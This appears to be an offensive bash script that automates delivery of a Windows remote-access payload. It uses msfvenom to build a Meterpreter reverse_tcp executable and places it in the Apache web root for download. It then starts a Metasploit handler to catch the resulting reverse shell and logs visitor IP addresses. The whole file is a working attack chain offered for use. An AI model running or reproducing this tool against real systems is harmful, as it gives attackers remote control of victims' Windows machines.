#!/bin/bash

# Set default values
LPORT=11506
DOWNLOAD_DIR="/var/www/html/downloads"
CONFIG_FILE="payload_config.txt"
VERBOSE=0

# Define usage function
usage() {
  cat <<EOM
Usage: $(basename "$0") [options]
Options:
  -h, --help          Display this help message
  -l, --lhost <ip>    Specify the LHOST value (default: local IP address)
  -p, --lport <port>  Specify the LPORT value (default: 11506)
  -d, --dir <dir>     Specify the download directory (default: /var/www/html/downloads)
  -c, --config <file> Specify a configuration file (default: payload_config.txt)
  -v, --verbose       Enable verbose output
EOM
  exit 1
}

# Parse command-line options
while getopts ":hvl:p:d:c:" o; do
  case "${o}" in
    h) usage ;;
    l) LHOST=${OPTARG} ;;
    p) LPORT=${OPTARG} ;;
    d) DOWNLOAD_DIR=${OPTARG} ;;
    c) CONFIG_FILE=${OPTARG} ;;
    v) VERBOSE=1 ;;
    *) usage ;;
  esac
done
shift $((OPTIND-1))

# Load configuration file if specified
if [ -f "$CONFIG_FILE" ]; then
  source "$CONFIG_FILE"
fi

# Set the local IP address if not specified
if [ -z "$LHOST" ]; then
  LOCAL_IP=$(hostname -I | awk '{print $1}')
  LHOST=$LOCAL_IP
fi

# Set the payload name
PAYLOAD_NAME="payload_$(date +%s).exe"

# Define the start_server function
start_server() {
  echo "Web server started at http://$LHOST/"
  echo "To download the payload, visit http://$LHOST$DOWNLOAD_DIR/$PAYLOAD_NAME"

  # Start Apache web server
  sudo systemctl start apache2

  # Continuously print the access log to the terminal
  echo "Visitors:"
  sudo tail -f /var/log/apache2/access.log | awk '{print $1}'
}

# Generate the payload using msfvenom
echo "Generating payload..."
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$DOWNLOAD_DIR/$PAYLOAD_NAME"

if [ $? -ne 0 ]; then
  echo "Payload generation failed. Exiting."
  exit 1
fi

# Set the file permissions for the payload
echo "Setting file permissions..."
sudo chmod 644 "$DOWNLOAD_DIR/$PAYLOAD_NAME"

# Start the Metasploit listener
echo "Starting Metasploit listener..."
gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"

# Start the web server and print the access log to the terminal
start_server

# Stop the web server and Metasploit listener when the script is terminated
trap 'echo "Stopping web server and Metasploit listener..."; sudo systemctl stop apache2; exit' SIGINT
